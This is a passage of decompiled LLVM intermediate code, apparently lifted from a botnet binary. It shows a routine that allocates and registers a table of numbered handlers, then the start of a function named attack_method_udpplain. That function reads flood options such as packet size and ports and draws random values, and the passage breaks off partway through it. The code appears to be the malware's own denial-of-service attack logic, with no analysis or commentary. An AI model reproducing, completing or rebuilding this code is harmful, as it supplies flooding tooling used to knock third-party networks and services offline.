  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_216d4.30, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_216d4.30, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_89ac.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_216d4.30, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_216d4.30, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_216d4.30, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_b330.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 43900, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_216d4.30, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 43900, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 43900, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_216d4.30, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_216d4.30, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 35916, i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_216d4.30, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 35916, i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 35916, i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_216d0.28 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_216d1.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_216d0.28, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_216d0.28 to i32), { 1, 0 }
}

define i32 @attack_method_udpplain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %v18_89ac = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_89c8, i32* @sl, align 4
  %v0_89d4 = load i32, i32* @r7, align 4
  %v2_89d8 = call i32 @calloc(i32 %v0_89d4, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89e4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_89d8, i32* @r8, align 4
  %v0_89f4 = load i32, i32* @r5, align 4
  %v4_89f8 = inttoptr i32 %v0_89e4 to i32*
  %v5_89f8 = call i32 @attack_get_opt_int(i32 %v0_89f4, i32* %v4_89f8, i32 7, i32 65535)
  %v3_8a00 = urem i32 %v5_89f8, 65536
  %v0_8a04 = load i32, i32* @r6, align 4
  %v0_8a0c = load i32, i32* @r4, align 4
  store i32 %v0_8a0c, i32* %r3.global-to-local, align 4
  %v0_8a10 = load i32, i32* @r5, align 4
  %v5_8a18 = inttoptr i32 %v0_8a04 to i32*
  %v6_8a18 = call i32 @attack_get_opt_int(i32 %v0_8a10, i32* %v5_8a18, i32 6, i32 %v0_8a0c)
  %v0_8a1c = load i32, i32* @r6, align 4
  %v3_8a20 = mul i32 %v6_8a18, 65536
  store i32 %v3_8a20, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_8a2c = load i32, i32* @r5, align 4
  %v4_8a30 = inttoptr i32 %v0_8a1c to i32*
  %v5_8a30 = call i32 @attack_get_opt_int(i32 %v0_8a2c, i32* %v4_8a30, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r6, align 4
  %v0_8a44 = load i32, i32* @r5, align 4
  %v3_8a48 = urem i32 %v5_8a30, 65536
  store i32 %v3_8a48, i32* @r5, align 4
  %v4_8a4c = inttoptr i32 %v0_8a40 to i32*
  %v5_8a4c = call i32 @attack_get_opt_int(i32 %v0_8a44, i32* %v4_8a4c, i32 1, i32 1)
  %v0_8a50 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a50 = udiv i32 %v0_8a50, 65536
  store i32 %v3_8a50, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a58 = load i32, i32* @r4, align 4
  %v9_8a58 = icmp eq i32 %v3_8a50, %v1_8a58
  br i1 %v9_8a58, label %dec_label_pc_8a88, label %bb

bb:                                               ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v4_8a70 = udiv i32 %v0_8a50, 16777216
  store i32 %v4_8a70, i32* %r3.global-to-local, align 4
  %v2_8a5c = mul nuw nsw i32 %v3_8a50, 256
  %v6_8a78 = or i32 %v2_8a5c, %v4_8a70
  %extract.t61 = trunc i32 %v6_8a78 to i16
  br label %dec_label_pc_8a98

dec_label_pc_8a88:                                ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v0_8a88 = call i32 @rand_next()
  %extract.t62 = trunc i32 %v0_8a88 to i16
  br label %dec_label_pc_8a98

dec_label_pc_8a98:                                ; preds = %bb, %dec_label_pc_8a88
  %v6_8a78.sink.off0 = phi i16 [ %extract.t61, %bb ], [ %extract.t62, %dec_label_pc_8a88 ]
